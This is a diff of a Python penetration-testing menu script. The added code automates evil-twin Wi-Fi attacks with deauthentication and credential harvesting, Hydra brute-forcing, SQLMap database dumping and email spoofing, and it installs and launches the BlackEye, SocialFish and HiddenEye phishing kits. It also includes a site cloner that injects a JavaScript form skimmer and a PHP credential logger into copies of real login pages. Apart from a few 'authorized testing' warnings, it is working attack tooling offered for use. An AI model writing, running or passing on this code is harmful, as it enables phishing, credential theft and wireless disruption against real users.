+        print("[!] Evil Twin AP stopped.")
+        if 'proc' in locals():
+            proc.terminate()
     except Exception as e:
         print(f"[-] airbase-ng failed: {e}")
 
 def deauth_rogue_ap():
     ensure_installed("airbase-ng", "aircrack-ng")
+    if not check_root():
+        print("[-] Root privileges required for Deauth + Rogue AP attack.")
+        return
+        
     iface = input("Wireless interface in monitor mode (e.g. wlan0mon): ").strip()
+    if not iface:
+        print("[-] Interface required.")
+        return
+        
+    if not check_monitor_mode(iface):
+        print(f"[-] {iface} is not in monitor mode. Use: sudo airmon-ng start {iface}")
+        return
+        
     ssid = input("SSID to clone (target network name): ").strip()
+    if not ssid:
+        print("[-] SSID required.")
+        return
+        
     channel = input("Channel (default 6): ").strip() or "6"
     bssid = input("Target BSSID (AP MAC): ").strip()
+    if not bssid:
+        print("[-] BSSID required.")
+        return
+        
     client = input("Target client MAC (leave blank for broadcast): ").strip()
-    print("[!] First, deauth clients from the real AP...")
-    if client:
-        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, iface])
-    else:
-        subprocess.run(["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, iface])
-    print("[+] Now starting Evil Twin AP...")
+    
+    print("[!] This attack will:")
+    print("  1. Deauth clients from the real AP")
+    print("  2. Start a fake AP with the same SSID")
+    print("  3. Capture credentials when clients reconnect")
+    
     log_wifi_mitm_result(f"Deauth+Rogue AP: SSID={ssid}, channel={channel}, iface={iface}, bssid={bssid}, client={client if client else 'broadcast'}")
-    print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface created by airbase-ng.")
-    print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
-    print("[!] After capturing, use Wireshark's 'Follow TCP Stream' and search for login/password fields.")
+    
+    # Start deauth attack
+    print("[*] Starting deauth attack...")
     try:
-        subprocess.run(["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface])
+        if client:
+            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client, iface]
+        else:
+            deauth_cmd = ["sudo", "aireplay-ng", "--deauth", "10", "-a", bssid, iface]
+            
+        print(f"[+] Running deauth: {' '.join(deauth_cmd)}")
+        deauth_proc = subprocess.Popen(deauth_cmd)
+        
+        # Wait a moment for deauth to take effect
+        time.sleep(3)
+        
+        print("[+] Now starting Evil Twin AP...")
+        print("[!] For credential harvesting, run Wireshark or tcpdump on the at0 interface.")
+        print("[!] Example: sudo wireshark -i at0 or sudo tcpdump -i at0 -w wifi_mitm.pcap")
+        
+        # Start evil twin
+        airbase_cmd = ["sudo", "airbase-ng", "-e", ssid, "-c", channel, iface]
+        print(f"[+] Running: {' '.join(airbase_cmd)}")
+        
+        airbase_proc = subprocess.Popen(airbase_cmd)
+        airbase_proc.wait()
+        
+    except KeyboardInterrupt:
+        print("[!] Attack stopped.")
+        if 'deauth_proc' in locals():
+            deauth_proc.terminate()
+        if 'airbase_proc' in locals():
+            airbase_proc.terminate()
     except Exception as e:
-        print(f"[-] airbase-ng failed: {e}")
+        print(f"[-] Attack failed: {e}")
+        if 'deauth_proc' in locals():
+            deauth_proc.terminate()
+        if 'airbase_proc' in locals():
+            airbase_proc.terminate()
 
 def wifiphisher_attack():
     ensure_installed("wifiphisher", "wifiphisher")
@@ -1796,143 +2339,1862 @@ def advanced_ipv6_attacks():
 
 # --- END ADVANCED ATTACK MODULES ---
 
-# Split menu into core and advanced
-core_menus = [
-    [
-        ("1. ARP Scan", lambda: arp_scan()),
-        ("2. Port Scan", lambda: port_scan(input("Target IP: "))),
-        ("3. Whois Lookup", lambda: whois_lookup(input("Domain: "))),
-        ("4. HTTP Headers", lambda: headers_grabber(input("URL (http/https): "))),
-        ("5. Crack SHA256 Hash", lambda: crack_hash(input("SHA256 hash: "))),
-        ("6. DNS Lookup", lambda: dns_lookup(input("Domain: "))),
-        ("7. SSL Certificate Info", lambda: ssl_info(input("Domain (no http): "))),
-        ("8. Subdomain Finder", lambda: find_subdomains(input("Domain: "))),
-        ("9. Directory Bruteforce", lambda: dir_bruteforce(input("Base URL (http/https): "))),
-        ("10. CVE Search", lambda: cve_lookup(input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): "))),
-        ("98. OSINT Toolkit", osint_menu),
-        ("99. Next Page", None),
-        ("0. Exit", None)
+# Wrapper functions for core menu options
+def arp_scan_wrapper():
+    print("[+] ARP Scan - Find live hosts on local network")
+    print("[!] This requires sudo privileges.")
+    input("Press Enter to continue...")
+    arp_scan()
+    input("\n[Press Enter to return to the menu]")
+
+def port_scan_wrapper():
+    print("[+] Port Scan - Scan target for open ports")
+    target = input("Target IP/hostname: ").strip()
+    if not target:
+        print("[-] Target required.")
+        return
+    port_scan(target)
+    input("\n[Press Enter to return to the menu]")
+
+def whois_wrapper():
+    print("[+] Whois Lookup - Get domain registration info")
+    domain = input("Domain: ").strip()
+    if not domain:
+        print("[-] Domain required.")
+        return
+    whois_lookup(domain)
+    input("\n[Press Enter to return to the menu]")
+
+def headers_wrapper():
+    print("[+] HTTP Headers - Get HTTP response headers")
+    url = input("URL (http/https): ").strip()
+    if not url:
+        print("[-] URL required.")
+        return
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    headers_grabber(url)
+    input("\n[Press Enter to return to the menu]")
+
+def crack_hash_wrapper():
+    print("[+] Crack SHA256 Hash - Attempt to crack password hash")
+    hash_input = input("SHA256 hash: ").strip()
+    if not hash_input:
+        print("[-] Hash required.")
+        return
+    if len(hash_input) != 64:
+        print("[-] Invalid SHA256 hash length. Should be 64 characters.")
+        return
+    crack_hash(hash_input)
+    input("\n[Press Enter to return to the menu]")
+
+def dns_wrapper():
+    print("[+] DNS Lookup - Get DNS records for domain")
+    domain = input("Domain: ").strip()
+    if not domain:
+        print("[-] Domain required.")
+        return
+    dns_lookup(domain)
+    input("\n[Press Enter to return to the menu]")
+
+def ssl_wrapper():
+    print("[+] SSL Certificate Info - Get SSL certificate details")
+    domain = input("Domain (no http): ").strip()
+    if not domain:
+        print("[-] Domain required.")
+        return
+    ssl_info(domain)
+    input("\n[Press Enter to return to the menu]")
+
+def subdomain_wrapper():
+    print("[+] Subdomain Finder - Find subdomains of target domain")
+    domain = input("Domain: ").strip()
+    if not domain:
+        print("[-] Domain required.")
+        return
+    find_subdomains(domain)
+    input("\n[Press Enter to return to the menu]")
+
+def dir_brute_wrapper():
+    print("[+] Directory Bruteforce - Find hidden directories")
+    url = input("Base URL (http/https): ").strip()
+    if not url:
+        print("[-] URL required.")
+        return
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    dir_bruteforce(url)
+    input("\n[Press Enter to return to the menu]")
+
+def cve_wrapper():
+    print("[+] CVE Search - Search for vulnerabilities")
+    keyword = input("Keyword (e.g. apache) or CVE ID (e.g. CVE-2023-1234): ").strip()
+    if not keyword:
+        print("[-] Keyword or CVE ID required.")
+        return
+    cve_lookup(keyword)
+    input("\n[Press Enter to return to the menu]")
+
+# Advanced wrapper functions for options 11-30
+def gobuster_wrapper():
+    print("[+] Gobuster Directory Scan - Advanced web directory enumeration")
+    print("[!] This tool will find hidden directories and files on web servers.")
+    url = input("Target URL (http/https): ").strip()
+    if not url:
+        print("[-] URL required.")
+        return
+    if not url.startswith(('http://', 'https://')):
+        url = 'http://' + url
+    
+    print("[!] Choose scan type:")
+    print("1. Quick scan (common directories)")
+    print("2. Full scan (large wordlist)")
+    print("3. Custom wordlist")
+    print("4. File extensions scan")
+    
+    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
+    
+    wordlist = "/usr/share/wordlists/dirb/common.txt"
+    extensions = ""
+    
+    if choice == "1":
+        wordlist = "/usr/share/wordlists/dirb/common.txt"
+        print("[+] Quick scan with common directories")
+    elif choice == "2":
+        wordlist = "/usr/share/wordlists/dirb/big.txt"
+        print("[+] Full scan with large wordlist")
+    elif choice == "3":
+        wordlist = input("Custom wordlist path: ").strip()
+        if not wordlist or not os.path.exists(wordlist):
+            print("[-] Wordlist not found. Using default.")
+            wordlist = "/usr/share/wordlists/dirb/common.txt"
+    elif choice == "4":
+        extensions = input("File extensions (e.g. php,html,txt): ").strip()
+        if extensions:
+            extensions = f"-x {extensions}"
+        print(f"[+] File extension scan: {extensions}")
+    else:
+        print("[-] Invalid choice. Using quick scan.")
+    
+    if not os.path.exists(wordlist):
+        print(f"[-] Wordlist not found: {wordlist}")
+        print("[!] Installing wordlists...")
+        subprocess.run(["sudo", "apt", "install", "-y", "dirb"])
+        if not os.path.exists(wordlist):
+            print("[-] Could not find wordlist. Using basic scan.")
+            wordlist = "/usr/share/wordlists/dirb/common.txt"
+    
+    print(f"[+] Starting Gobuster scan on {url}")
+    print(f"[+] Wordlist: {wordlist}")
+    
+    cmd = ["gobuster", "dir", "-u", url, "-w", wordlist, "-t", "50"]
+    if extensions:
+        cmd.extend(extensions.split())
+    
+    try:
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        if proc.stdout is not None:
+            for line in proc.stdout:
+                print(line, end='')
+        proc.wait()
+        print("[+] Gobuster scan completed.")
+    except Exception as e:
+        print(f"[-] Gobuster failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def nmap_advanced_wrapper():
+    print("[+] Nmap Advanced Scan - Professional network reconnaissance")
+    print("[!] This is a comprehensive network scanning tool.")
+    target = input("Target IP/hostname/network: ").strip()
+    if not target:
+        print("[-] Target required.")
+        return
+    
+    print("[!] Choose scan profile:")
+    print("1. Stealth scan (SYN scan, no ping)")
+    print("2. Aggressive scan (OS detection, version detection)")
+    print("3. Vulnerability scan (NSE scripts)")
+    print("4. Full port scan (all 65535 ports)")
+    print("5. Custom scan")
+    
+    choice = input("Select scan profile (1-5, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        options = "-sS -Pn -T4 --top-ports 1000"
+        print("[+] Stealth SYN scan (no ping, top 1000 ports)")
+    elif choice == "2":
+        options = "-sS -sV -O -A -T4"
+        print("[+] Aggressive scan (OS/version detection)")
+    elif choice == "3":
+        options = "-sS -sV --script=vuln -T4"
+        print("[+] Vulnerability scan with NSE scripts")
+    elif choice == "4":
+        options = "-sS -p- -T4"
+        print("[+] Full port scan (all 65535 ports)")
+    elif choice == "5":
+        options = input("Custom Nmap options: ").strip()
+        if not options:
+            options = "-sS -A -T4"
+    else:
+        options = "-sS -Pn -T4 --top-ports 1000"
+    
+    output_file = f"nmap_scan_{target.replace('/', '_')}.txt"
+    
+    print(f"[+] Starting Nmap scan on {target}")
+    print(f"[+] Options: {options}")
+    print(f"[+] Output: {output_file}")
+    
+    cmd = ["nmap"] + options.split() + [target, "-oN", output_file]
+    
+    try:
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+        proc.wait()
+        print(f"[+] Nmap scan completed. Results saved to {output_file}")
+        
+        # Show summary
+        if os.path.exists(output_file):
+            with open(output_file, 'r') as f:
+                content = f.read()
+                open_ports = [line for line in content.split('\n') if 'open' in line]
+                if open_ports:
+                    print(f"\n[+] Found {len(open_ports)} open ports:")
+                    for port in open_ports[:10]:  # Show first 10
+                        print(f"  {port}")
+                    if len(open_ports) > 10:
+                        print(f"  ... and {len(open_ports) - 10} more")
+    except Exception as e:
+        print(f"[-] Nmap failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def hydra_advanced_wrapper():
+    print("[+] Hydra Advanced Brute Force - Professional password cracking")
+    print("[!] This tool will attempt to crack login credentials.")
+    
+    target = input("Target IP/hostname: ").strip()
+    if not target:
+        print("[-] Target required.")
+        return
+    
+    print("[!] Choose attack type:")
+    print("1. Single user brute force")
+    print("2. User list brute force")
+    print("3. Password list brute force")
+    print("4. Custom attack")
+    
+    choice = input("Select attack type (1-4, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        username = input("Username: ").strip()
+        if not username:
+            print("[-] Username required.")
+            return
+        user_list = username
+        user_flag = "-l"
+    elif choice == "2":
+        user_list = input("User list file: ").strip()
+        if not user_list or not os.path.exists(user_list):
+            print("[-] User list file not found.")
+            return
+        user_flag = "-L"
+    elif choice == "3":
+        username = input("Username: ").strip()
+        if not username:
+            print("[-] Username required.")
+            return
+        user_list = username
+        user_flag = "-l"
+    elif choice == "4":
+        username = input("Username or user list file: ").strip()
+        if os.path.exists(username):
+            user_list = username
+            user_flag = "-L"
+        else:
+            user_list = username
+            user_flag = "-l"
+    else:
+        print("[-] Invalid choice.")
+        return
+    
+    service = input("Service (ssh,ftp,http-post-form,etc.): ").strip()
+    if not service:
+        print("[-] Service required.")
+        return
+    
+    # Get password list
+    wordlist = input("Password wordlist (default /usr/share/wordlists/rockyou.txt): ").strip()
+    if not wordlist:
+        wordlist = "/usr/share/wordlists/rockyou.txt"
+    
+    if not os.path.exists(wordlist):
+        print(f"[-] Wordlist not found: {wordlist}")
+        print("[!] Installing rockyou wordlist...")
+        subprocess.run(["sudo", "apt", "install", "-y", "wordlists"])
+        if not os.path.exists(wordlist):
+            print("[-] Could not find wordlist.")
+            return
+    
+    print(f"[+] Starting Hydra attack on {target}")
+    print(f"[+] Service: {service}")
+    print(f"[+] Wordlist: {wordlist}")
+    
+    cmd = ["hydra", user_flag, user_list, "-P", wordlist, target, service, "-t", "4"]
+    
+    try:
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        if proc.stdout is not None:
+            for line in proc.stdout:
+                print(line, end='')
+        proc.wait()
+        print("[+] Hydra attack completed.")
+    except Exception as e:
+        print(f"[-] Hydra failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def sqlmap_advanced_wrapper():
+    print("[+] SQLMap Advanced Injection - Professional SQL injection testing")
+    print("[!] This tool will test for SQL injection vulnerabilities.")
+    
+    url = input("Target URL (with parameter): ").strip()
+    if not url:
+        print("[-] URL required.")
+        return
+    
+    if not '=' in url:
+        print("[-] URL must contain a parameter (e.g., ?id=1)")
+        return
+    
+    print("[!] Choose scan type:")
+    print("1. Basic scan (batch mode)")
+    print("2. Advanced scan (crawl, forms)")
+    print("3. Custom scan")
+    print("4. Database dump")
+    
+    choice = input("Select scan type (1-4, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        options = "--batch --random-agent"
+        print("[+] Basic scan with batch mode")
+    elif choice == "2":
+        options = "--batch --crawl=2 --forms --random-agent"
+        print("[+] Advanced scan with crawling and forms")
+    elif choice == "3":
+        options = input("Custom SQLMap options: ").strip()
+        if not options:
+            options = "--batch --random-agent"
+    elif choice == "4":
+        options = "--batch --dump --random-agent"
+        print("[+] Database dump mode")
+    else:
+        options = "--batch --random-agent"
+    
+    print(f"[+] Starting SQLMap scan on {url}")
+    print(f"[+] Options: {options}")
+    
+    cmd = ["sqlmap", "-u", url] + options.split()
+    
+    try:
+        print(f"[+] Running: {' '.join(cmd)}")
+        proc = subprocess.Popen(cmd)
+        proc.wait()
+        print("[+] SQLMap scan completed.")
+    except Exception as e:
+        print(f"[-] SQLMap failed: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def setoolkit_advanced_wrapper():
+    print("[+] Social Engineering Toolkit (SET) - Advanced social engineering")
+    print("[!] WARNING: Use only for authorized, ethical testing.")
+    print("[!] This tool requires root privileges.")
+    
+    if not check_root():
+        print("[-] Root privileges required for SET.")
+        return
+    
+    print("[!] SET will launch in a new terminal window.")
+    print("[!] Follow the interactive menu in the SET terminal.")
+    print("[!] Common SET modules:")
+    print("  1. Spear-Phishing Attack Vectors")
+    print("  2. Website Attack Vectors")
+    print("  3. Infectious Media Generator")
+    print("  4. Create a Payload and Listener")
+    print("  5. Mass Mailer Attack")
+    
+    confirm = input("Launch SET? (y/N): ").strip().lower()
+    if confirm == 'y':
+        try:
+            subprocess.run(["sudo", "setoolkit"])
+        except Exception as e:
+            print(f"[-] SET failed: {e}")
+    else:
+        print("[!] SET launch cancelled.")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def email_spoof_advanced_wrapper():
+    print("[+] Advanced Email Spoofing - Professional email spoofing")
+    print("[!] This is for testing email security only.")
+    
+    print("[!] Choose spoofing method:")
+    print("1. Local sendmail test")
+    print("2. SMTP relay test")
+    print("3. Custom SMTP server")
+    
+    choice = input("Select method (1-3, default 1): ").strip() or "1"
+    
+    sender = input("From (fake email): ").strip()
+    recipient = input("To (real email): ").strip()
+    subject = input("Subject: ").strip()
+    body = input("Message body: ").strip()
+    
+    if not all([sender, recipient, subject]):
+        print("[-] All fields required.")
+        return
+    
+    if choice == "1":
+        print("[+] Using local sendmail")
+        message = f"Subject: {subject}\nFrom: {sender}\nTo: {recipient}\n\n{body}"
+        try:
+            result = subprocess.run(["sendmail", recipient], input=message.encode(), capture_output=True, text=True)
+            if result.returncode == 0:
+                print("[+] Email sent via sendmail")
+            else:
+                print(f"[-] Sendmail failed: {result.stderr}")
+        except Exception as e:
+            print(f"[-] Sendmail error: {e}")
+    
+    elif choice == "2":
+        print("[+] Using SMTP relay")
+        smtp_server = input("SMTP server: ").strip() or "localhost"
+        smtp_port = input("SMTP port: ").strip() or "25"
+        
+        try:
+            import smtplib
+            server = smtplib.SMTP(smtp_server, int(smtp_port))
+            server.sendmail(sender, [recipient], f"Subject: {subject}\n\n{body}")
+            server.quit()
+            print("[+] Email sent via SMTP relay")
+        except Exception as e:
+            print(f"[-] SMTP error: {e}")
+    
+    elif choice == "3":
+        print("[+] Custom SMTP server")
+        smtp_server = input("SMTP server: ").strip()
+        smtp_port = input("SMTP port: ").strip() or "587"
+        username = input("Username (optional): ").strip()
+        password = input("Password (optional): ").strip()
+        
+        try:
+            import smtplib
+            server = smtplib.SMTP(smtp_server, int(smtp_port))
+            if username and password:
+                server.starttls()
+                server.login(username, password)
+            server.sendmail(sender, [recipient], f"Subject: {subject}\n\n{body}")
+            server.quit()
+            print("[+] Email sent via custom SMTP")
+        except Exception as e:
+            print(f"[-] SMTP error: {e}")
+    
+    input("\n[Press Enter to return to the menu]")
+
+def phishing_advanced_wrapper():
+    print("[+] Advanced Phishing Toolkit - Professional phishing simulation")
+    print("[!] WARNING: Use only for authorized security testing.")
+    
+    print("[!] Choose phishing framework:")
+    print("1. BlackEye Phishing Framework")
+    print("2. SocialFish Phishing Framework")
+    print("3. HiddenEye Phishing Framework")
+    print("4. Advanced Site Cloner")
+    print("5. Custom Phishing Templates")
+    print("6. Automated Phishing Campaign")
+    print("7. Phishing Server Setup")
+    
+    choice = input("Select framework (1-7, default 1): ").strip() or "1"
+    
+    if choice == "1":
+        blackeye_phishing()
+    elif choice == "2":
+        socialfish_phishing()
+    elif choice == "3":
+        hiddeneye_phishing()
+    elif choice == "4":
+        advanced_site_cloner()
+    elif choice == "5":
+        custom_phishing_templates()
+    elif choice == "6":
+        automated_phishing_campaign()
+    elif choice == "7":
+        phishing_server_setup()
+    
+    input("\n[Press Enter to return to the menu]")
+
+def blackeye_phishing():
+    print("[+] BlackEye Phishing Framework")
+    print("[!] Installing and setting up BlackEye...")
+    
+    # Check if BlackEye is already installed
+    blackeye_path = "/opt/BlackEye"
+    if not os.path.exists(blackeye_path):
+        print("[+] Installing BlackEye...")
+        try:
+            # Clone BlackEye repository
+            subprocess.run(["sudo", "git", "clone", "https://github.com/thelinuxchoice/blackeye.git", blackeye_path])
+            subprocess.run(["sudo", "chmod", "+x", f"{blackeye_path}/blackeye.sh"])
+            print("[+] BlackEye installed successfully!")
+        except Exception as e:
+            print(f"[-] Failed to install BlackEye: {e}")
+            return
+    else:
+        print("[+] BlackEye already installed.")
+    
+    print("[!] BlackEye provides 40+ phishing templates:")
+    print("  - Social Media: Facebook, Instagram, Twitter, LinkedIn")
+    print("  - Email Services: Gmail, Yahoo, Outlook")
+    print("  - Gaming: Steam, Epic Games, Origin")
+    print("  - Banking: PayPal, Stripe, Banking portals")
+    print("  - Cloud Services: Dropbox, Google Drive, OneDrive")
+    print("  - And many more...")
+    
+    print("\n[!] Launching BlackEye...")
+    print("[!] In the BlackEye menu, you can:")
+    print("  1. Choose from 40+ phishing templates")
+    print("  2. Customize phishing pages")
+    print("  3. Set up ngrok tunneling")
+    print("  4. Monitor captured credentials")
+    print("  5. Generate phishing links")
+    
+    try:
+        subprocess.run(["sudo", "bash", f"{blackeye_path}/blackeye.sh"])
+    except Exception as e:
+        print(f"[-] Failed to launch BlackEye: {e}")
+
+def socialfish_phishing():
+    print("[+] SocialFish Phishing Framework")
+    print("[!] Installing and setting up SocialFish...")
+    
+    socialfish_path = "/opt/SocialFish"
+    if not os.path.exists(socialfish_path):
+        print("[+] Installing SocialFish...")
+        try:
+            subprocess.run(["sudo", "git", "clone", "https://github.com/UndeadSec/SocialFish.git", socialfish_path])
+            subprocess.run(["sudo", "chmod", "+x", f"{socialfish_path}/SocialFish.py"])
+            print("[+] SocialFish installed successfully!")
+        except Exception as e:
+            print(f"[-] Failed to install SocialFish: {e}")
+            return
+    else:
+        print("[+] SocialFish already installed.")
+    
+    print("[!] SocialFish features:")
+    print("  - Advanced phishing templates")
+    print("  - Custom domain support")
+    print("  - Real-time credential capture")
+    print("  - Multi-platform compatibility")
+    
+    try:
+        subprocess.run(["sudo", "python3", f"{socialfish_path}/SocialFish.py"])
+    except Exception as e:
+        print(f"[-] Failed to launch SocialFish: {e}")
+
+def hiddeneye_phishing():
+    print("[+] HiddenEye Phishing Framework")
+    print("[!] Installing and setting up HiddenEye...")
+    
+    hiddeneye_path = "/opt/HiddenEye"
+    if not os.path.exists(hiddeneye_path):
+        print("[+] Installing HiddenEye...")
+        try:
+            subprocess.run(["sudo", "git", "clone", "https://github.com/DarkSecDevelopers/HiddenEye.git", hiddeneye_path])
+            subprocess.run(["sudo", "chmod", "+x", f"{hiddeneye_path}/HiddenEye.py"])
+            print("[+] HiddenEye installed successfully!")
+        except Exception as e:
+            print(f"[-] Failed to install HiddenEye: {e}")
+            return
+    else:
+        print("[+] HiddenEye already installed.")
+    
+    print("[!] HiddenEye features:")
+    print("  - Advanced anti-detection")
+    print("  - Custom phishing templates")
+    print("  - Real-time monitoring")
+    print("  - Multi-language support")
+    
+    try:
+        subprocess.run(["sudo", "python3", f"{hiddeneye_path}/HiddenEye.py"])
+    except Exception as e:
+        print(f"[-] Failed to launch HiddenEye: {e}")
+
+def advanced_site_cloner():
+    print("[+] Advanced Site Cloner - Professional website cloning")
+    
+    url = input("Target website URL: ").strip()
+    if not url:
+        print("[-] URL required.")
+        return
+    
+    if not url.startswith(('http://', 'https://')):
+        url = 'https://' + url
+    
+    print("[!] Choose cloning method:")
+    print("1. Basic clone (HTML only)")
+    print("2. Advanced clone (HTML + CSS + JS)")
+    print("3. Full clone (with resources)")
+    print("4. Custom clone (selective)")
+    
+    method = input("Select method (1-4, default 2): ").strip() or "2"
+    
+    folder = f"phish_clone_{int(time.time())}"
+    os.makedirs(folder, exist_ok=True)
+    
+    print(f"[+] Cloning {url} using method {method}...")
+    
+    try:
+        import requests
+        from bs4 import BeautifulSoup
+        import urllib.parse
+        
+        # Get the main page
+        headers = {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
+        }
+        
+        response = requests.get(url, headers=headers, timeout=10)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        
+        if method == "1":
+            # Basic clone - just HTML
+            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
+                f.write(response.text)
+            print(f"[+] Basic clone saved to {folder}/index.html")
+        
+        elif method == "2":
+            # Advanced clone - HTML + CSS + JS
+            # Download CSS files
+            css_files = []
+            for link in soup.find_all('link', rel='stylesheet'):
+                css_url = link.get('href')
+                if css_url:
+                    if css_url.startswith('//'):
+                        css_url = 'https:' + css_url
+                    elif css_url.startswith('/'):
+                        css_url = urllib.parse.urljoin(url, css_url)
+                    elif not css_url.startswith('http'):
+                        css_url = urllib.parse.urljoin(url, css_url)
+                    
+                    try:
+                        css_response = requests.get(css_url, headers=headers)
+                        css_filename = f"style_{len(css_files)}.css"
+                        with open(f"{folder}/{css_filename}", "w") as f:
+                            f.write(css_response.text)
+                        css_files.append(css_filename)
+                        link['href'] = css_filename
+                    except:
+                        pass
+            
+            # Download JS files
+            js_files = []
+            for script in soup.find_all('script', src=True):
+                js_url = script.get('src')
+                if js_url:
+                    if js_url.startswith('//'):
+                        js_url = 'https:' + js_url
+                    elif js_url.startswith('/'):
+                        js_url = urllib.parse.urljoin(url, js_url)
+                    elif not js_url.startswith('http'):
+                        js_url = urllib.parse.urljoin(url, js_url)
+                    
+                    try:
+                        js_response = requests.get(js_url, headers=headers)
+                        js_filename = f"script_{len(js_files)}.js"
+                        with open(f"{folder}/{js_filename}", "w") as f:
+                            f.write(js_response.text)
+                        js_files.append(js_filename)
+                        script['src'] = js_filename
+                    except:
+                        pass
+            
+            # Save modified HTML
+            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
+                f.write(str(soup))
+            
+            print(f"[+] Advanced clone saved to {folder}/")
+            print(f"[+] Downloaded {len(css_files)} CSS files and {len(js_files)} JS files")
+        
+        elif method == "3":
+            # Full clone - with all resources
+            print("[+] Full cloning (this may take a while)...")
+            
+            # Create assets directory
+            assets_dir = f"{folder}/assets"
+            os.makedirs(assets_dir, exist_ok=True)
+            
+            # Download images
+            img_files = []
+            for img in soup.find_all('img'):
+                img_url = img.get('src')
+                if img_url:
+                    if img_url.startswith('//'):
+                        img_url = 'https:' + img_url
+                    elif img_url.startswith('/'):
+                        img_url = urllib.parse.urljoin(url, img_url)
+                    elif not img_url.startswith('http'):
+                        img_url = urllib.parse.urljoin(url, img_url)
+                    
+                    try:
+                        img_response = requests.get(img_url, headers=headers)
+                        img_filename = f"img_{len(img_files)}.{img_url.split('.')[-1] if '.' in img_url else 'jpg'}"
+                        with open(f"{assets_dir}/{img_filename}", "wb") as f:
+                            f.write(img_response.content)
+                        img_files.append(img_filename)
+                        img['src'] = f"assets/{img_filename}"
+                    except:
+                        pass
+            
+            # Download other resources (CSS, JS, etc.)
+            for link in soup.find_all('link', rel='stylesheet'):
+                css_url = link.get('href')
+                if css_url:
+                    if css_url.startswith('//'):
+                        css_url = 'https:' + css_url
+                    elif css_url.startswith('/'):
+                        css_url = urllib.parse.urljoin(url, css_url)
+                    elif not css_url.startswith('http'):
+                        css_url = urllib.parse.urljoin(url, css_url)
+                    
+                    try:
+                        css_response = requests.get(css_url, headers=headers)
+                        css_filename = f"style_{len(css_files)}.css"
+                        with open(f"{assets_dir}/{css_filename}", "w") as f:
+                            f.write(css_response.text)
+                        link['href'] = f"assets/{css_filename}"
+                    except:
+                        pass
+            
+            # Save modified HTML
+            with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
+                f.write(str(soup))
+            
+            print(f"[+] Full clone saved to {folder}/")
+            print(f"[+] Downloaded {len(img_files)} images and other resources")
+        
+        elif method == "4":
+            # Custom clone - selective
+            print("[+] Custom cloning options:")
+            print("1. Clone only forms")
+            print("2. Clone with custom modifications")
+            print("3. Clone specific elements")
+            
+            custom_choice = input("Select custom option (1-3): ").strip()
+            
+            if custom_choice == "1":
+                # Clone only forms
+                forms = soup.find_all('form')
+                if forms:
+                    print(f"[+] Found {len(forms)} forms")
+                    for i, form in enumerate(forms):
+                        form_html = str(form)
+                        with open(f"{folder}/form_{i}.html", "w", encoding='utf-8') as f:
+                            f.write(form_html)
+                    print(f"[+] Forms saved to {folder}/")
+                else:
+                    print("[-] No forms found on the page")
+            
+            elif custom_choice == "2":
+                # Clone with custom modifications
+                # Add phishing capture script
+                capture_script = """
+                <script>
+                document.addEventListener('DOMContentLoaded', function() {
+                    var forms = document.querySelectorAll('form');
+                    forms.forEach(function(form) {
+                        form.addEventListener('submit', function(e) {
+                            e.preventDefault();
+                            var formData = new FormData(form);
+                            var data = {};
+                            for (var pair of formData.entries()) {
+                                data[pair[0]] = pair[1];
+                            }
+                            // Send to capture script
+                            fetch('capture.php', {
+                                method: 'POST',
+                                headers: {'Content-Type': 'application/json'},
+                                body: JSON.stringify(data)
+                            });
+                            // Continue with original form submission
+                            form.submit();
+                        });
+                    });
+                });
+                </script>
+                """
+                
+                # Insert capture script
+                head = soup.find('head')
+                if head:
+                    script_tag = soup.new_tag('script')
+                    script_tag.string = capture_script
+                    head.append(script_tag)
+                
+                with open(f"{folder}/index.html", "w", encoding='utf-8') as f:
+                    f.write(str(soup))
+                
+                # Create capture script
+                php_capture = """
+                <?php
+                $data = json_decode(file_get_contents('php://input'), true);
+                if ($data) {
+                    $log = "Time: " . date('Y-m-d H:i:s') . "\n";
+                    $log .= "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+                    $log .= "User-Agent: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
+                    $log .= "Data: " . json_encode($data) . "\n";
+                    $log .= "---\n";
+                    file_put_contents('captured.txt', $log, FILE_APPEND);
+                }
+                ?>
+                """
+                
+                with open(f"{folder}/capture.php", "w") as f:
+                    f.write(php_capture)
+                
+                print(f"[+] Custom clone with capture script saved to {folder}/")
+        
+        print(f"[+] Site cloning completed! Files saved to {folder}/")
+        print(f"[+] To deploy: copy files to web server and access index.html")
+        
+    except Exception as e:
+        print(f"[-] Cloning failed: {e}")
+
+def custom_phishing_templates():
+    print("[+] Custom Phishing Templates")
+    
+    print("[!] Choose template type:")
+    print("1. Banking/Financial")
+    print("2. Social Media")
+    print("3. Email Services")
+    print("4. Cloud Storage")
+    print("5. Gaming Platforms")
+    print("6. Corporate/Enterprise")
+    print("7. Custom Template Builder")
+    
+    template_choice = input("Select template type (1-7): ").strip()
